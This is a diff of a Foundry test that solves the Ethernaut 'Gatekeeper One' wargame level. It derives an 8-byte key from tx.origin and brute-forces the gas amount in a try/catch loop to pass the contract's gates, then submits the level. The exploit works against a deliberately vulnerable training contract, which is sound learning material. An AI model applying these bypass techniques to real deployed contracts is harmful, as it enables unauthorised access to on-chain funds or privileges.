@@ -1,7 +1,6 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../GatekeeperOne/GatekeeperOne.sol";
 import "../GatekeeperOne/GatekeeperOneHack.sol";
 import "../GatekeeperOne/GatekeeperOneFactory.sol";
 import "../Ethernaut.sol";
@@ -9,57 +8,72 @@ import "../Ethernaut.sol";
 
 interface CheatCodes {
   // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input  
-  function startPrank(address, address) external;
+  function startPrank(address) external;
   // Resets subsequent calls' msg.sender to be `address(this)`
   function stopPrank() external;
+  // Sets an address' balance
+  function deal(address who, uint256 newBalance) external;
 }
 
 contract GatekeeperOneTest is DSTest {
     CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
-    GatekeeperOneHack gatekeeperOneHack;
-    GatekeeperOneFactory gatekeeperOneFactory;
-    address levelAddress;
-    bool levelSuccessfullyPassed;
+    address eoaAddress = address(100);
 
     function setUp() public {
-        // Setup instances of the Ethernaut & GatekeeperOneFactory contracts
+        // Setup instance of the Ethernaut contracts
         ethernaut = new Ethernaut();
-        gatekeeperOneFactory = new GatekeeperOneFactory();
+        // Deal EOA address some ether
+        cheats.deal(eoaAddress, 5 ether);
     }
 
     function testGatekeeperOneHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
 
-        // Register the Ethernaut GatekeeperOne level (this would have already been done on Rinkeby)
+        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
         ethernaut.registerLevel(gatekeeperOneFactory);
-
-        // Add some ETH to the 0 address which we will be using 
-        payable(address(0)).transfer(1 ether);
-
-        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
-        cheats.startPrank(address(0), address(0));
-
-        // Set up the Level
-        levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
-
-        // Cast the level address to the GatekeeperOne contract class
+        cheats.startPrank(tx.origin);
+        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
         GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
-
-
-        // Create GatekeeperOneHack contract
-        gatekeeperOneHack = new GatekeeperOneHack(levelAddress);
-
-        // Call the attack function
-        gatekeeperOneHack.attack(bytes8(abi.encode(uint16(uint160(tx.origin)))), 56348);
-
-        // Submit level to the core Ethernaut contract
-        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-
-
-        // Stop the prank - calls with no longer come from address(0) 
         cheats.stopPrank();
 
-        // Verify the level has passed
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+
+        // Create GatekeeperOneHack contract
+        GatekeeperOneHack gatekeeperOneHack = new GatekeeperOneHack(levelAddress);
+
+        // Need at 8 byte key that matches the conditions for gate 3 - we start from the fixed value - uint16(uint160(tx.origin) - then work out what the key needs to be
+        bytes4 halfKey = bytes4(bytes.concat(bytes2(uint16(0)),bytes2(uint16(uint160(tx.origin)))));
+        // key = "0x0000ea720000ea72"
+        bytes8 key = bytes8(bytes.concat(halfKey, halfKey));
+
+        // View emitted values and compare them to the requires in Gatekeeper One
+        emit log_named_uint("Gate 3 all requires", uint32(uint64(key)));
+        emit log_named_uint("Gate 3 first require", uint16(uint64(key)));
+        emit log_named_uint("Gate 3 second require", uint64(key));
+        emit log_named_uint("Gate 3 third require", uint16(uint160(tx.origin)));
+
+        // Loop through a until correct gas is found, use try catch to get arounf the revert
+        for (uint i = 0; i <= 8191; i++) {
+            try ethernautGatekeeperOne.enter{gas: 73990+i}(key) {
+                emit log_named_uint("Pass - Gas", 73990+i);
+                break;
+            } catch {
+                emit log_named_uint("Fail - Gas", 73990+i);
+            }
+        }
+        
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+
+        cheats.startPrank(tx.origin);
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        cheats.stopPrank();
         assert(levelSuccessfullyPassed);
     }
 }
